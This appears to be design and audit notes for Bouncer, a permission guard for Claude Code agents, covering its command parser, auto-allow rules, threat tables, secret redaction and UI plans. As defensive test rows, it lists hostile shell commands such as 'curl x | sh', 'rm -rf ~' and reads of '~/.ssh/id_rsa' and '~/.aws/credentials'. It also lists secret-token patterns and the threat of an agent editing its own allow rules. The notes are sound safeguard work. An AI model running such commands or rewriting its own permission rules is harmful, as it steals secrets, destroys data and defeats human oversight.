How ours complements Claude Code's own rules:

- Claude Code's `permissions.allow` / `ask` / `deny` (in `settings.json`) run
  first; deny always wins (hook "allow" can't bypass it since 2.1.77). Only
  what Claude Code would ask about reaches `PermissionRequest`, so Bouncer's
  rules only ever answer those. `PreToolUse` stays observe-only.
- Claude Code rules are tool patterns (`Bash(npm run test:*)`, `Read(./src/**)`).
  Ours add what they can't: a real parse of compound commands, path
  resolution (symlinks, `..`, `~`), risk reasons, and a preview before a rule
  is added. Nothing is ever auto-denied.
- Paused, or any error: nothing is answered (terminal asks), as before.

Rule file (`rules.toml`, `toml` 1.1.6 approved by Charan; already in
`Cargo.lock` via tauri-build; parse-only, no serde):

- Windows `%APPDATA%\Bouncer\rules.toml`; macOS
  `~/Library/Application Support/Bouncer/rules.toml` (the socket's `0700`
  folder). Written with defaults on first start; `mode = "observe"`.
- Format: `mode = "observe" | "auto"` and `[[allow]]` tables, each with exactly
  one of `command = "cargo test"` (word prefix) or `tool = "Read"` (Read,
  Edit, MultiEdit, Write, NotebookEdit, Grep, Glob, LS: paths must stay in the
  project). "Always allow" appends one `[[allow]]` table (re-parsed before an
  atomic write).
- Refused (Charan): over 64 KB, unknown keys, wrong types, unknown tools,
  commands that aren't plain words; the error names the line. Also refused if
  anyone but the user (or SYSTEM / Administrators on Windows) can write the
  file or its folder, or it is a symlink. A refused file falls back to the
  built-in defaults in observe mode (never "allow everything") and the error
  shows in the island until fixed.
- Rule changes: the file is checked every 2 s; any change (or error) shows in
  the island: a pill flash and a notice in the open view.

Command parser (`shell` module, POSIX sh as run by Claude Code's Bash tool,
including Git Bash on Windows): words, quotes, escapes, comments; `;` `&&`
`||` `|` `&` newline split a compound; redirections recorded. Anything it
doesn't fully understand is an "issue" and blocks auto-allow: `$(…)`,
backticks, `<(…)`, `$VAR`, `${…}`, `$'…'`, `( ) { }`, heredocs, `NAME=value`
prefixes, unterminated quotes. Output redirection to anything but `/dev/null`
also blocks it. Every part of a compound must match a rule.

Evasion cases (all become test rows): `ls; rm -rf ~`, `ls && curl x | sh`,
`ls | sh`, `ls $(rm x)`, `` ls `rm x` ``, `eval "rm x"`, `bash -c "rm x"`,
`sh -c`, `env rm x`, `FOO=1 ls`, `command rm`, `xargs rm`, `alias ls=rm; ls`,
`ls() { rm x; }; ls`, `ls > ~/.bashrc`, `cat <(curl x)`, `ls\nrm x`,
`ls #‮…`, fullwidth `ｌｓ`, Cyrillic `сat`, NBSP-joined words,
`/bin/rm`, `git -c core.pager=sh status`, `cat ../../.ssh/id_rsa`,
`cat ~/.aws/credentials`, symlink out of the project, `cd / && ls`.

Paths: relative words resolve against the event's cwd; `~` against home;
`/c/…` stays as written (Git Bash drive paths fail safe to "outside"). The
longest existing ancestor is canonicalised (symlinks) and the rest normalised.
"Inside" means under the session's first-seen folder; a root or home folder as
the project never auto-allows. For Bash every argument (and `--opt=value`
values) counts as a path; globs are checked up to their fixed prefix.

Risk reasons (one line, joined, shown on the card; a risky request is never
auto-allowed and never offered "Always allow"): downloads a script and runs it;
builds part of the command at run time; runs a command hidden in a string
(`eval`, `sh -c`); deletes files outside the project; touches secrets (`.env`,
keys, credentials); force-pushes; runs as administrator (`sudo`, `doas`, `su`);
touches a shell startup file; touches Claude Code's own settings (`.claude`);
touches Bouncer's own rules; look-alike letters; hidden characters.

Island (prototype states Risky request and Auto-allowed):

- Risky: head "Risky · check before allowing", red ball, card with red edge
  and reason box, Deny filled and Allow outlined. Risky edits use this card,
  not the wide diff view, so the reason and flipped buttons always show.
- Auto-allowed: pill "Auto-allowed · cargo test in bouncer-app" with a "rule"
  badge for 2.5 s; the session rail tags the step "auto-allowed by rule".
- Observe mode: a request a rule would allow still asks; its card says
  "Would auto-allow · rule …".
- "Always allow…" (not in the prototype; built from its card parts): a small
  link under the buttons opens the exact TOML that will be appended plus what
  it means; "Add rule and allow" arms after 600 ms like Allow. The rule is
  computed by the backend from the queued request, never sent by the page.
  Not offered for risky, compound, unparsed or out-of-project requests, or for
  shells, interpreters and wrappers (`bash`, `python`, `env`, `sudo`, `rm`, …).
- New command `always(id)` (manifest + capability).

Request IDs: 128 bits from `getrandom` 0.4 (already in the tree via
`tauri-utils` → `uuid`), replacing the `RandomState` hashes. If the OS RNG
fails, the request isn't queued (terminal asks).

Phase 3 threats:

| Threat | Fix |
| --- | --- |
| Compound command smuggles a dangerous part | Every part must match; any parse issue → ask |
| Substitution / eval / `sh -c` / process substitution | Parse issue (ask) + risk reason |
| Env and alias tricks (`FOO=x cmd`, `env`, `alias`, functions) | Assignment and grouping are issues; wrappers match no default rule |
| Look-alike or invisible characters | Words compared exactly; risk reasons for mixed scripts and hidden characters |
| Path escape (`..`, `~`, absolute, symlink) | Resolved and canonicalised; outside the project → ask |
| Agent edits `rules.toml` to allow itself | Path is outside the project (ask) and flagged "touches Bouncer's own rules"; every change shows in the island |
| Rules file writable by another user | Owner / mode (macOS) or owner / DACL (Windows) checked; refused → defaults, observe |
| Broken or huge rules file | 64 KB cap; strict keys and types with line numbers; defaults in observe mode |
| Over-broad "Always allow" | Exact rule previewed; never for risky / compound / shells and wrappers; arms after 600 ms |
| Page forges a rule | `always(id)` takes only a live request ID; the backend builds the rule |
| Predictable request IDs | OS RNG via `getrandom` |
| Auto-allow while paused | Paused answers nothing, rules included |

Phase 3 is done when:

- [x] `rules.toml` created with defaults in observe mode; strict loading with
      line-numbered errors, 64 KB cap, refused when others can write; errors fall
      back to defaults (observe) and show in the island (tests for each)
- [x] Parser + compound handling; unparseable → ask
- [x] Paths resolved (symlink, `..`, `~`); outside the project → ask
- [x] Risk reasons shown on the Risky card (prototype); never auto-allowed
- [x] Auto mode auto-allows with the Auto-allowed pill (prototype) and a rail tag
- [x] "Always allow" previews the exact rule; backend builds it
- [x] Rule changes shown in the island
- [x] Request IDs from `getrandom`
- [x] 150+ case table incl. every evasion example; fuzz: no panic, no auto-allow
      of metacharacters
- [x] Manual: a playground session in auto mode auto-allows `git status`-style
      requests and flags a risky one (`cargo check` auto-allowed; `curl | sh`
      flagged and denied)
- [x] fmt, clippy, tests green locally and in CI (Windows + macOS)

Plan corrections found in this audit:

1. "Auto-allow (logged)": the activity log is Phase 4; until then the session
   rail records "auto-allowed by rule".
2. Observe mode's "Would auto-allow" appears on the card, not the pill: in
   observe mode the request still needs the user, so a card is up.
3. "Always allow" and the rules notice aren't in the prototype; they reuse its
   card, badge and `.after` styles.
4. (Implement) `BOUNCER_RULES` overrides the rules file in debug/test builds
   only (like `BOUNCER_ENDPOINT`), so dev runs never write the real config
   folder; CI proves release ignores it.
5. (Implement) The capability now has six commands (`always` added).
6. (Implement) While the island is hidden (no sessions) a rules flash isn't
   seen; the change notice and a red "rules" badge show once it's peeked or
   opened.
7. (Test) The fuzzer found `cat &&` read as plain `cat`. A dangling or
   leading operator (`&& ls`, `ls |`, `;;`) is now a parse issue (bash
   wouldn't run it anyway).
8. (Verify) An argument whose file name matched the program (`rm ../rm`)
   skipped the delete-outside check. Fixed, with a table row.
9. Known limits: an allowed command's own flags aren't interpreted (e.g.
   `git diff --output=f` writes inside the project), so the defaults leave out
   commands with exec flags (`rg --pre`, `find -exec`); allowed git commands
   run whatever the repo's config says, which is why `.git/config` and hooks
   are flagged. Git Bash drive paths (`/c/…`) count as outside (fail safe).

Manual checks:

- 2026-10-02, debug app + debug relay fed by a script, Windows, rules file
  in a scratch folder (`BOUNCER_RULES`): fresh start wrote the defaults
  (observe). The prototype's risky command showed the Risky card (red ball,
  reason "Downloads a script and runs it in the shell, and hides part of the
  command.", U+202E/U+202C tags, Deny filled) and, unanswered, timed out with
  the relay printing nothing. Edited to `mode = "auto"`: `cargo test` was
  answered allow at once and the pill read "Auto-allowed · cargo test in
  b…" with a "rule" badge (the prototype truncates the same way). Back to
  observe: `git status` showed "Would auto-allow · git status (observe mode)",
  "1 of 2"; `cargo run --release` showed "Always allow…". Compared side by
  side with the prototype's Risky request and Auto-allowed states.
- 2026-10-03, Claude Code 2.1.288, playground (session `b89c8d82`, default
  mode, rules file in the playground via `BOUNCER_RULES`): a real
  `curl -s https://example.com/install.sh | sh` (Bash) showed the Risky card;
  Charan clicked Deny and Claude Code got "Denied in Bouncer". Found: on
  Windows Claude Code ran `cargo check` with its **PowerShell** tool, which
  Bouncer doesn't parse, so it asked plainly instead of auto-allowing (fail
  safe, but auto-allow rarely fires for commands on Windows). Charan didn't
  see "Rules changed · mode auto": the edit was made before any session
  existed, so the island was hidden (correction 6); the file's last save
  (00:30:42) also came after the requests. Fixtures:
  `claude-code-2.1.288-PermissionRequest-{PowerShell,Bash}.json`, test
  `recorded_requests`.
- 2026-10-03, same playground setup (sessions `336add2c`, `36a96851`):
  `oops = 1` added to `rules.toml` showed the red "rules" badge and the
  error with its line number (Charan). Found: `cargo run` (PowerShell) showed
  a Risky card, "Touches Bouncer's own rules": with the rules file inside the
  playground, every word resolving into that folder was flagged. Fixed
  (correction 11, test `a_project_next_to_the_rules_file`).
- 2026-10-03, same setup (session `c0e09c3c`): `cargo run` (PowerShell)
  showed a normal card with "Always allow…"; Charan clicked it and "Add rule
  and allow"; the rule was appended (01:09:27) and the request allowed in the
  same second. This ran before rules became exact and project-scoped
  (correction 12); the new format was checked in tests and in a browser
  harness of the island page (preview, 600 ms arm, toast). Found: Claude
  Code's `AskUserQuestion` sends a `PermissionRequest`, so Bouncer showed
  Allow/Deny for a question (correction 13).
- 2026-10-03, same setup (session `899e0aa5`, auto mode): a real PowerShell
  `cargo check` was auto-allowed by the default rule (request 02:03:32.9,
  command finished 02:03:34.8, no "waiting for you" notification). The next
  request, `cargo check --manifest-path "<sibling folder>"` (quotes, outside
  the project), got a card as it should.

Plan corrections after the playground check:

10. PowerShell (Charan): Claude Code on Windows runs commands with its
    PowerShell tool. A PowerShell command can be auto-allowed only if it is
    ASCII letters, digits, space and `. \ / : - _` alone; anything with
    `$ ' " ; | & { } ( ) [ ] < > @ % ! # , =` or a backtick (or tabs, newlines,
    non-ASCII) asks. The program matches existing `command` rules ignoring
    case (the rest of the words exactly), so `iex`, `rm`, `del`,
    `Start-Process` and the like are never auto-allowed or offered. Every
    risk check runs on a rough reading of any PowerShell command (`iwr | iex`,
    `Remove-Item` outside, `-Verb RunAs`, `iex` / `-Command` strings, `$(`).
    Case table (91 rows incl. each character and alias) and fuzz.
11. "Touches Bouncer's own rules" means the rules file itself or its whole
    folder (delete, replace), not other files that sit beside it.
12. "Always allow" is exactly this command (or this one file) in this
    project (Charan, matching prototype v0.4: "Only this exact command in
    this project"). New optional keys: `exact = true`, `path` (tool rules,
    one file), `project`; both paths stored and compared fully resolved
    (symlinks, `..`), ignoring case on Windows. Hand-written prefix rules and
    the defaults are unchanged. The card follows prototype v0.4: a dashed
    full-width "Always allow…" button, a preview of the exact TOML, Cancel /
    "Add rule and allow" (arms after 600 ms), never on risky cards. The wide
    "Approve an edit" view has none, as in the prototype. In auto mode the
    "Rule added" message is followed by the Auto-allowed pill for 2.5 s, as
    the prototype; in observe mode it isn't (nothing is auto-allowed there).
13. `AskUserQuestion` and `ExitPlanMode` (Charan): never a card, never an
    answer; Claude Code asks in the terminal. The session shows "Needs you ·
    question in the terminal" (row and pill) until the tool runs.
    **Changed by c2 (Charan, 2026-10-14):** they get a card of their own
    (pick options / Approve plan or Keep planning), answered only by a
    click; the terminal still asks meanwhile, and whichever answers first
    wins. Paused, a shape Bouncer doesn't accept, free text: "question in
    the terminal" as before. See "c2" under the roadmap.
14. (CI) Windows writes the built-in Administrator account's SID as `LA` in
    a security descriptor; the GitHub runner is that account, so its own
    rules file was refused. `LA` now counts as the user when the user's SID
    ends in `-500`. PowerShell table rows with drive paths run on Windows
    only.
15. (CI) Windows short (8.3) paths like `C:\Users\RUNNER~1\…` contain `~`,
    so a PowerShell command naming one always asks (fail safe; Claude Code
    normally sends long paths). A test covers it. Also fixed: a test that sent
    two requests at once and assumed their order (raced on CI).

## Phase 4 — Activity log and away summary (~1 week)

- **Audit:** exact stored fields; secret patterns (API keys, tokens, URL passwords,
  private keys, `.env` values).
- **Implement:** JSON Lines day files in the app data folder, owner-only (was SQLite;
  changed by Charan in the audit); redaction before write; never
  store outputs or file contents; 30-day retention + "Wipe history"; away summary
  after 10+ idle minutes (files changed, commands, auto-allowed vs asked, where it got
  stuck, time; token cost only if hook data has it).
- **Test:** redaction fixture of fake secrets; retention; summary of a recorded
  30-minute session.
- **Verify:** nothing leaves the machine; no fake secret anywhere on disk after tests.
- Commits: `feat(log): local event store` → `feat(log): secret redaction` →
  `feat(log): retention and wipe` → `feat(ui): away summary card` → `test(log): redaction and summary fixtures`

### Phase 4 audit (2026-10-03)

Sources: Phase 1–3 notes, `approvals.rs` (the desk), the recorded hook
fixtures (2.1.143 / 2.1.287 / 2.1.288), `design/prototype/bouncer-island.html`
(state "Away summary" and its notes).

Storage (Charan, 2026-10-03): **JSON Lines, std + `serde_json`, no new
dependency**, replacing SQLite (CLAUDE.md updated):

- One file per UTC day, `history/activity-YYYY-MM-DD.jsonl`, in the folder
  holding `rules.toml` (`%APPDATA%\Bouncer`, `~/Library/Application
  Support/Bouncer`; in dev runs next to `BOUNCER_RULES`, so dev never writes
  the real folder). Folder `0700`, files `0600` on macOS; on Windows they
  inherit `%APPDATA%`'s user-only list.
- Before writing a day file, the rules file's owner check runs on the file
  and its folder (owner + mode / owner + DACL, no links). Refused → nothing
  is written that day and the island shows a quiet note.
- One event per line, written with one `write_all` in append mode. A
  half-written last line (crash) is skipped on read, as is any line that
  doesn't parse.
- 10 MB cap per day file: once a line wouldn't fit, logging stops for that
  day and the island shows a quiet note. The disk can't fill from us.
- Only the app writes the log. The relay never touches it.
- Retention: day files older than 30 days are deleted at start and when the
  day changes. "Wipe history" (tray) deletes every day file and the summary.

Stored fields, exactly (anything else is never written):

| Field | What | Notes |
| --- | --- | --- |
| `t` | time, ms since 1970 | |
| `session` | Claude Code's session ID | |
| `project` | the session's folder (`cwd`) | redacted |
| `kind` | hook name (`PreToolUse`, `PostToolUse`, `PermissionRequest`, `Stop`, …) or `Answer` | |
| `tool` | tool name | |
| `label` | the session-list step, e.g. `Running cargo test`, `Editing main.rs` | first line only, redacted, then cut to 200 characters |
| `file` | full path, edit tools only (Edit, MultiEdit, Write, NotebookEdit) | redacted, cut to 1,000 |
| `how` | `Answer` only: `auto-allowed by rule`, `you allowed`, `you denied`, `asked in terminal` | |

Never stored: tool outputs (the relay already drops `tool_response`), file
contents and edit strings (`content`, `old_string`, `new_string`), the rest of
a command after its first line, prompts (`UserPromptSubmit` logs only its
kind), notification text, assistant messages, transcript paths, URLs and
search patterns (their steps are "Browsing the web" / "Searching").

Secret patterns (redacted to `[redacted]` before anything reaches disk; the
whole command is redacted before its first line is taken and cut, so a cut
can't leave part of a secret behind):

1. Private key blocks: `-----BEGIN … PRIVATE KEY-----` to its `END` line (or
   the end of the text).
2. Passwords in URLs: `scheme://user:password@host` → `scheme://user:[redacted]@host`.
3. Known token prefixes: `sk-` (OpenAI, Anthropic `sk-ant-`), `sk_live_`,
   `sk_test_`, `rk_live_`, `whsec_` (Stripe), `ghp_` `gho_` `ghu_` `ghs_`
   `ghr_` `github_pat_` (GitHub), `glpat-` (GitLab), `xoxb-` `xoxp-` `xoxa-`
   `xoxr-` `xoxs-` (Slack), `AKIA` / `ASIA` (AWS key IDs), `AIza` (Google),
   `hf_`, `npm_`, `pypi-`, `eyJ` (JWT parts), followed by 8+ token characters.
4. Secret-named assignments: `NAME=value`, `--name=value`, and a word after
   `--name` / `name:` (a flag or a header), where the name contains `pass`,
   `pwd`, `secret`, `token`, `key`, `auth`, `credential` or `cookie` (any
   case). `.env` lines (`OPENAI_API_KEY=…`) are this case; `.env` files'
   contents are never stored at all.
5. The word after `Bearer` / `Basic` (HTTP auth headers).
6. Anything else that looks like a key: a run of 32+ letters, digits, `_`
   `+` `=` with both letters and digits (AWS secret keys, hex tokens, JWT
   signatures). Git hashes get caught too; over-redacting a local log is fine.

Away summary (prototype state "Away summary"):

- "Away" is OS input idle time: `GetLastInputInfo` on Windows (two
  `windows-sys` features on the crate we already use), `CGEventSourceSeconds
  SinceLastEventType` from CoreGraphics on macOS (system framework, no crate).
  Checked every 2 s on the existing rules-watch thread. Idle 10+ minutes then
  input again = "came back".
- On return the summary is built from the day files for the idle span and the
  island opens on it, only if anything was logged in that span. A card that
  is waiting still comes first.
- Head: idle ball, "While you were away", "· N min". Four stats (18 px, 600,
  tabular): **files changed** (distinct paths of edit tools' `PostToolUse`),
  **commands** (`PreToolUse` of Bash / PowerShell), **auto-allowed** (tool
  calls that didn't need you: `PreToolUse` minus "asked you"), **asked you**
  (`PermissionRequest`s not answered by a rule, questions included). Then
  "**Stuck N min** in <folder>, waiting on <command or step>": the longest wait
  on the user, from a request until it was answered on the card, or else
  until that session's next hook event (the terminal prompt was answered; not
  counting `Notification`), or now; shown at 1 min or more. Then the session rows.
- × closes it (the existing `expand(false)`; the backend drops the summary).
  No new command.
- Token cost: no hook event carries usage or cost (checked every recorded
  fixture; only the transcript has it, which we never read), so it's left out.
- `BOUNCER_AWAY_SECS` shortens the 10 minutes in debug builds only, for the
  manual check.

Idle sessions (Phase 2 correction 7): a session with no event for **30 min**
is dropped from the list, unless it's waiting on the user ("needs you" / "asks
in terminal"), which stays **4 h** so the away summary can still point at it;
a session with a card in the queue is never dropped. Any later event brings it
back as a new row. Checked on the same 2 s tick.

Phase 4 threats:

| Threat | Fix |
| --- | --- |
| Secrets written to disk | Redacted before write (six pattern families); only first command lines and paths kept; never contents, outputs or prompts |
| A cut secret slips past the patterns | Redact the whole text first, then take the first line and cut |
| Another account reads or plants history | Owner-only folder and files; owner check before writing; links refused |
| Log fills the disk | 10 MB per day file, then stops for the day with a note; 30-day retention |
| Corrupt or half-written file breaks the summary | Bad lines skipped; reads never fail the app |
| Hostile text in the summary | Backend `visible()` + `textContent` only, as every other agent string |
| History leaves the machine | No network code; no new dependency; the relay never reads it |
| Wipe leaves data behind | Plain files deleted (no database free pages or journals) |
| Away summary hides a waiting request | Cards render first; summary only when the queue is empty |
| Dead sessions stay forever | 30 min / 4 h expiry; queued sessions kept |

Phase 4 is done when:

- [x] Day files written owner-only, refused if others can write; one event per
      line; bad lines skipped; 10 MB cap with a note in the island
- [x] Redaction of all six families, before write (fake-secret fixture; no
      fake secret in any log file the tests write)
- [x] 30-day retention and "Wipe history" (tray)
- [x] Away summary matching the prototype's "Away summary" state, from the
      log, after 10+ idle minutes
- [x] Summary of a 30-minute session fixture gives the expected numbers
- [x] Idle sessions drop off (30 min; 4 h when waiting on the user)
- [x] Manual: away summary in the real island after an idle span, next to the
      prototype; wipe; log file contents read by hand for secrets
- [x] fmt, clippy, tests green locally and in CI (Windows + macOS)

Plan corrections found in this audit:

1. Storage is JSON Lines, not SQLite (Charan).
2. Token cost isn't in any hook payload; not shown.
3. "Auto-allowed" in the summary counts every tool call that didn't need the
   user (Claude Code's own rules or Bouncer's), as the prototype's numbers
   imply (26 auto-allowed of 31 commands, 3 asked).
4. Day files are per UTC day (std has no time zones); retention counts UTC days.
5. (Implement) "Stuck" ends when the user answers the card; only a request
   that went to the terminal waits until the session's next hook event (else
   a command's run time after "Allow" counted as being stuck).
6. (Implement) Retention runs when a day file is first opened (the first
   event after start or after midnight UTC), not on a timer.
7. (Test) `activity::read` looped over every day in the asked span; a test
   asking for "everything" hung. It now reads at most the last 31 days (older
   files are deleted anyway), with a test.
8. (Test, Charan) Local test runs: the two fuzz tests were 21 of the 30 s.
   They run 500 rounds in a debug build and 5,000 in release or with
   `BOUNCER_FUZZ_ITERS` (CI sets 5,000). CI's check job is capped at 30 min.
9. (Verify) Scanning the test log files on disk for the fake secrets found
   the end of one: a secret with `/` inside a Write path left its last chunk
   in the step label ("Editing <file name>"). Paths are now redacted before
   the label is made, and the test checks every 8+ character piece of each
   secret, not just the whole. A rescan after a fresh run found none.
10. (Verify) Gitleaks flagged two fake test strings typed literally (a
    private key header, a Basic auth header). They're built at run time now
    and the fix was folded into the redaction commit, so the branch history
    has no scanner hits.
11. (Verify, Charan) `BOUNCER_AWAY_SECS` is read in debug builds only; a test
    proves it and CI runs it in release, like `BOUNCER_ENDPOINT` / `BOUNCER_RULES`.
12. (After merge, Charan) Known limit: Claude Code sends **no hook event**
    when a request is answered No in its own terminal prompt: no
    `PostToolUseFailure`, no `Stop`, no `Notification` (playground test,
    Claude Code 2.1.288, session `b1ce8275`: `PreToolUse` and
    `PermissionRequest` at 15:00:55, then nothing for 4 minutes;
    `PostToolUseFailure` was subscribed for the test and removed after).
    Bouncer can't tell a No from a prompt still waiting, so a session left
    "asks in terminal" with no new event for 2 minutes shows "Waiting in
    terminal" (row and rail, no spinner) until its next event, or drops off
    after 4 h. Fixture `crates/core/tests/fixtures/claude-code-2.1.288-denied-in-terminal.jsonl`.
13. (After merge, Charan) Three more redacted forms, each in the fake-secret
    table: a login after `-u` / `--user` (or glued, `-uuser:pass`,
    `--user=user:pass`) keeps the user and hides what follows the colon;
    anything glued onto `-p` (`mysql -pSECRET`; option clusters like
    `-pthread` get hidden too); and JSON written as one word, where a
    secret-named key's value is hidden (`{"token":"x"}`, `{"api_key":1}`).

Manual checks (2026-10-03, Charan, Windows, Claude Code 2.1.288, playground
session `7931c6f2`, debug app with `BOUNCER_RULES` in the playground and
`BOUNCER_AWAY_SECS=60`):

- Away summary, `acceptEdits` session writing three files and running
  `echo`: after 90 s hands off, moving the mouse opened "While you were
  away" with 3 files changed, 1 command, 4 auto-allowed, 0 asked you, no
  stuck line, the playground row. Pass.
- × closed it; a later idle span with nothing logged opened nothing. Pass.
- Stuck, `default` session: `hostname` never asked. Claude Code 2.1.288 ran
  it as a read-only command with no `PermissionRequest` (recorded events
  191–194), so Bouncer had nothing to show and counted it auto-allowed
  (correct; read-only commands no longer reach Bouncer). Redone with
  `mkdir away-stuck`: card, left alone until it went to the terminal; on
  return "While you were away · 2 min", 0 / 1 / 0 / 1 and "Stuck 2 min in
  bouncer-playground, waiting on mkdir away-stuck", row "Asking in the
  terminal". Matches the prototype's Away summary. Pass.
- Day file and secrets: `echo DB_PASSWORD=letmein123
  https://user:hunter2pass@example.com` was logged as `DB_PASSWORD=[redacted]`
  and `user:[redacted]@example.com`; `Select-String` for both secrets found
  nothing; `icacls` on `history` lists only SYSTEM, Administrators and the
  user. Pass.
- Tray "Wipe history": pill "History wiped · the activity log is empty"
  with a "log" badge; no day file left; the next prompt started a new file
  (4 lines, all after the wipe). Pass.
- Not by hand: a session closed without `SessionEnd` dropping off after
  30 min (covered by `quiet_sessions_drop_off`).

> **Scope change (Charan, 2026-10-02):** after the security core (Phases 2–4),
> Phases 5–8 add the character, chat, file drop and music; packaging moves to
> Phase 9. The pitch stays "a security guard for coding agents, with
> personality". **None of Phases 5–9 starts until Phase 4 is merged.** Each
> phase's threats and "done when" below are a first draft; its Audit refines
> them before any code.

## Phase 5 — Character (~2 weeks)

- **Audit:** sketch a pose per state (idle, working, needs you, risky, done,
  paused, away); motion, CPU and sound budget; how eye tracking gets the cursor
  (inside the island only, or a backend cursor feed, and what that costs at
  idle); carry over the old Phase 5 items: settings screen, reduced motion,
  accessibility, keyboard access to the island (Phase 2 made it non-focusable).
- **Implement:** bouncing ball in SVG driven from JS (Charan, 2026-10-03; was a
  2D canvas), no image files: real physics bounce
  (gravity, squash and stretch); eyes that follow the cursor; blinking; squish on
  click; dizzy after repeated clicks; a pose per state (blocks the door when risky,
  hops when done); a launch greeting; Web Audio generated sounds; settings screen
  (sound, observe/auto-allow, rules file, hooks install/uninstall, wipe history);
  pause when hidden; honour OS reduced motion.
- **Observe / auto switch in the island** (Charan, 2026-10-03; Phase 5 with the
  settings screen): one switch shows the current mode. Turning auto on asks for
  confirmation first (what auto means, that risky requests still ask);
  turning it off doesn't. Bouncer writes `mode` into `rules.toml` itself: a
  new backend command, never the page sending file text; the same checked,
  atomic write as "Always allow", and the change shows in the island like
  any other.
- **Test:** each pose renders; physics stays stable at any frame rate; mute works;
  reduced motion stops bounce and tracking; keyboard-only settings; screen reader order.
- **Verify:** contrast ≥ 4.5:1; idle CPU ~0% (no animation frames while nothing
  moves); animations never cover or delay the approval card; `CREDITS.md`
  complete; nothing copied from Coucou.

| Threat | Fix |
| --- | --- |
| Animation hides or delays an approval | Card renders above the character; arm delay counts from the card, not the animation |
| Clicks on the character land on Allow | Character and approval buttons never overlap; squish/dizzy clicks stop at the character |
| Idle CPU / battery drain | Animation loop stops when idle or hidden; cursor feed throttled or window-local |
| Motion sickness | OS reduced motion honoured; setting to turn motion off |

Phase 5 is done when:

- [ ] Every state has a pose; bounce, eyes, blink, squish, dizzy, greeting work
- [ ] Generated sounds with mute; reduced motion honoured
- [ ] Settings screen, keyboard access and screen reader order checked by hand
- [ ] Idle CPU ~0%; approval card never covered
- [ ] fmt, clippy, tests green locally and in CI

Split (Charan, 2026-10-03): **5a** the character (physics, eyes, blink, poses,
greeting, reduced motion, idle CPU ~0%), plus a `redact.rs` fix; **5b** sounds,
the settings screen, the observe/auto switch, keyboard access and screen
reader order. Each is its own PR with all four stages; 5b starts after 5a is
merged. Rule for both (Charan): animations never cover, move or delay an
approval card, and never take focus from it.

### Phase 5a audit (2026-10-03)

Sources: `design/prototype/bouncer-island.html` ("Meet Bouncer", the ball
CSS, Build spec "Motion" and rule 10), `src/ball.ts`, `src/main.ts`,
`src/styles.css`, `crates/app/src/main.rs`, `crates/core/src/redact.rs`,
tauri 2.12.1 / tao 0.37.1 sources (cursor position).

What exists today:

- `ball.ts` builds the prototype's SVG element by element (no image, no
  `innerHTML`); five of the seven moods (idle, working, needs, risky,
  paused) are CSS keyframes copied from the prototype. **done** and
  **dance** are missing.
- Every view push rebuilds the island (`replaceChildren`), so each ball is
  a new node and its CSS animation restarts on every update (a visible
  hiccup today). 5a keeps the character's state (position, velocity, look,
  mood) in its own module; a rebuilt node picks it up where it was.
- Reduced motion: one CSS rule turns every animation off. JS motion has to
  check `matchMedia("(prefers-reduced-motion: reduce)")` itself and follow
  its `change` event.

Decisions (Charan, 2026-10-03):

1. **SVG, not a 2D canvas.** The prototype is SVG; keeping it gives the same
   shapes and colors exactly, stays crisp at 26 and 72 px, and needs no
   image. JS drives only `transform` on the SVG's own groups.
2. **The shades are the eyes.** A bouncer at a door wears shades, so there
   are no pupils. Looking: the face (shades, glint, mouth) shifts up to 1.5
   units (of 32) toward the cursor, the glint a little further. Blinking:
   the shades dip (`scaleY` 1 → 0.2 → 1, 140 ms).
3. **Breathe, then settle.** Idle breathes for about 10 s after any
   activity, then holds still (in WebView2 a CSS transform on an SVG child
   restyles and repaints on the main thread every frame). While idle it
   blinks every 8–12 s from one timer, not a loop. Working / needs / risky /
   done animate while they last. Reduced motion: no breathing, no blink.
4. **Cursor from the page's own mouse events only**, while the cursor is
   over the island. No backend feed, no OS polling, no new command. When
   the cursor leaves, the face eases back to centre. Idle cost: 0.
   (Weighed and not taken: tauri's own `AppHandle::cursor_position()`, no
   new dependency, 15 polls/s as main-loop messages while a ball shows, so
   he could look anywhere on screen.)
5. **Done and dance.** Done: a session going working → idle (its `Stop`)
   cheers twice (2.4 s), then idle. Dance is drawn now (sheet parity) but
   nothing triggers it until Phase 8.
6. **Keyboard access and screen reader order move to 5b**: making the
   island focusable touches "Allow is never the default focus, Enter never
   approves"; it goes in with the settings screen that needs it.
   5b also adds **Size** to the settings screen (Charan): Small (100%) /
   Medium (default) / Large, stored in Bouncer's own settings and applied
   at once (later lowered to 100 / 112 / 125%, 5b decision 6).
7. **Island scale and a quieter greeting** (Charan, after the hand check):
   the whole island (pill, Bouncer, session list, cards, text) is drawn at
   one scale, 125% by default, so the prototype's proportions never change
   (pill 360 × 45, open width 500, Bouncer ~33 px). It multiplies with
   Windows display scaling. If a shape would pass 40% of its screen's width
   it is drawn smaller, never under 100% (on a 1366-wide screen the 720-wide
   session detail stays at 100%). Prototype Build spec first (v0.6). This
   replaced a pill-only enlargement (336 × 42) tried the same day. The
   greeting is just Bouncer, centred, no words: he drops in and bounces
   three times, settled in 2.0 s (shown 2.5 s); never over a card, and none
   at all with reduced motion.

Motion design:

- `physics.ts`, no DOM: fixed 1/240 s steps with an accumulator, frame time
  clamped to 50 ms. Gravity and launch speed come from the spec (9-unit
  apex, 900 ms jump); squash 1.14 on landing, stretch 1.12 on take-off,
  spring back. Tests: same apex (± 0.2) at 30 / 60 / 144 / 240 Hz and with
  jittered frame times; energy never grows; it comes to rest.
- One `requestAnimationFrame` loop for all live balls; it runs only while
  something moves and stops when everything settles, when the island is the
  hidden strip, or when `document.hidden`.
- Poses (from the sheet): idle breathes, working jumps (physics), needs you
  hops with the orange "!", risky turns red, flat mouth, puffs up ("blocks
  the door"), done cheers, paused greys out and sleeps (static, "z"), music
  dances.
- Squish on click: a click on the ball squashes it (1.25, spring back) and
  goes no further (doesn't open the island). Four clicks within 2 s: dizzy
  (1.5 s wobble, shades tilted). Pointer handlers sit on the ball's SVG only.
- Greeting at launch: the ball drops in and bounces three times (~1.6 s) in
  the pill ("Bouncer · at the door"), then the normal state (the hidden strip
  if there are no sessions), riding the same path as the wake-strip peek.
  Reduced motion: the words only.

Threats (5a):

| Threat | Fix |
| --- | --- |
| Animation covers, moves or delays a card | Card rendering never waits on the character; motion is `transform` on SVG groups only (no layout change), upward / sideways by at most 16% of the ball; a card cancels the greeting, done and dizzy at once |
| Arm delay shortened or reset by animation | Arm counts from the card's arrival (`front.since`), unchanged; the character never calls `render()` |
| Character steals focus from a card | The window stays non-focusable; the ball has no `tabindex`, isn't a button; nothing calls `focus()` |
| Click on the character lands on Allow | Ball and buttons never overlap; ball clicks stop at the SVG |
